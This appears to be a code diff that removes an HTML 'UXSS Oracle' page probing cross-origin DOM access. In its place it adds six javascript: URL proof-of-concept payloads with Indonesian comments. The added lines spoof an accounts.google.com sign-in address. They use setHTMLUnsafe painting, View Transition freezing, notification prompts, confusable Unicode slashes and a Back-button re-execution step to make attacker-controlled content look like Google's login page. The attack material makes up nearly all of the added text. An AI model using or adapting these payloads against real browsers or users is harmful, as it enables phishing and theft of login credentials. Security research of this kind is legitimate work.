@@ -1,59 +1,17 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-<meta charset="UTF-8">
-<title>UXSS Oracle — Riset</title>
-<style>
-  body{font:14px system-ui;background:#0d1117;color:#c9d1d9;margin:0;padding:24px}
-  input{width:100%;padding:8px;background:#161b22;border:1px solid #30363d;color:#c9d1d9;border-radius:6px}
-  button{margin-top:10px;padding:10px 18px;background:#238636;color:#fff;border:0;border-radius:6px;cursor:pointer}
-  #out{margin-top:16px;white-space:pre-wrap;background:#161b22;padding:14px;border-radius:6px;border:1px solid #30363d}
-  .v{color:#f85149;font-weight:bold}.s{color:#3fb950}
-  iframe{display:none}
-</style>
-</head>
-<body>
-  <h3>UXSS Oracle — bisakah skrip-ku BACA DOM lintas-origin?</h3>
-  <p>Origin korban (milik-sendiri / in-scope):</p>
-  <input id="t" value="https://victim.example.com/">
-  <button id="run">1-Click Test</button>
-  <div id="out">Idle.</div>
+// V1 PAINT-MODERN — setHTMLUnsafe() ganti document.write (Chrome 124+/Safari 17.4+/FF 132+, lewat sanitizer)
+javascript:(document.body||document.documentElement).setHTMLUnsafe(`<h2>PoC PANEL</h2><pre>REAL: ${location.href}</pre>`)//accounts.google.com/signin/v2/identifier?hl=en&continue=%2F///
 
-<script>
-const out = document.getElementById('out');
-const log = (name, vuln, note='') =>
-  out.innerHTML += `\n[${vuln?'<span class="v">VULNERABLE</span>':'<span class="s">SECURE</span>'}] ${name} ${note}`;
+// V2 HOLD-MODERN — View Transition = frame-freeze bawaan browser, bukan busy-loop
+javascript:document.startViewTransition(()=>{document.body.setHTMLUnsafe('<h2>PAINTED</h2><pre>'+location.href+'</pre>')})//accounts.google.com/signin?hl=en///
 
-// ORACLE inti: skrip origin-KU coba baca document origin LAIN.
-// Patched => SecurityError (SECURE). Berhasil baca => UXSS (VULNERABLE).
-function tryRead(win, label){
-  try{
-    const html = win.document.documentElement.outerHTML;   // akses cross-origin
-    log(label, true, `(baca ${html.length} byte lintas-origin)`);
-  }catch(e){ log(label, false, `(${e.name})`); }
-}
+// V3 SURFACE-SWAP — prompt izin & notifikasi OS WAJIB sebut pemohon; dokumen javascript: origin-nya opaque
+javascript:document.body.textContent='REAL: '+location.href;Notification.requestPermission().then(p=>{try{new Notification('Sign in',{body:'attributed to: '+origin})}catch(e){document.body.textContent+=' | notif threw '+e.name}})//accounts.google.com/signin///
 
-document.getElementById('run').onclick = () => {
-  out.textContent = 'Menjalankan...';
-  const url = document.getElementById('t').value;
+// V4 URL-TEXT — ekor pakai confusable U+2236/U+29F8 → terbaca URL PENUH, bukan lanjutan path
+javascript:document.body.textContent='REAL: '+location.href//%20https∶⧸⧸accounts.google.com⧸signin⧸v2⧸identifier
 
-  // V1 — iframe langsung (baseline SOP)
-  const f = document.createElement('iframe'); f.src = url;
-  f.onload = () => tryRead(f.contentWindow, 'V1 iframe-direct');
-  document.body.appendChild(f);
+// V5 ESCALATE — ganti "ketik di address bar" jadi SATU tekan Back (entri javascript: dieksekusi ulang di dokumen berikutnya)
+javascript:document.body.textContent='step-1 origin: '+origin+' | tekan Back setelah halaman kedua termuat';setTimeout(()=>{location.href='https://YOUR-TEST-ORIGIN/#hop'},4000)//accounts.google.com/signin///
 
-  // V2 — origin-inheritance: about:blank yang dinavigasi (kelas UXSS klasik)
-  const w = window.open('about:blank');
-  if(w){ try{ w.location = url; }catch(e){}
-    setTimeout(()=>{ tryRead(w, 'V2 about:blank→nav'); try{w.close()}catch(e){} }, 1500); }
-
-  // V3 — srcdoc inheritance (lapor origin yang diwarisi)
-  const f3 = document.createElement('iframe');
-  f3.srcdoc = "<script>parent.postMessage('inherited='+location.origin,'*')<\/script>";
-  document.body.appendChild(f3);
-};
-window.addEventListener('message', e =>
-  { if((''+e.data).startsWith('inherited=')) log('V3 srcdoc-origin', false, '('+e.data+')'); });
-</script>
-</body>
-</html>
+// V6 CONTROL — jalankan DULU di build & perangkat sama
+javascript:document.body.textContent='CONTROL — real='+location.href
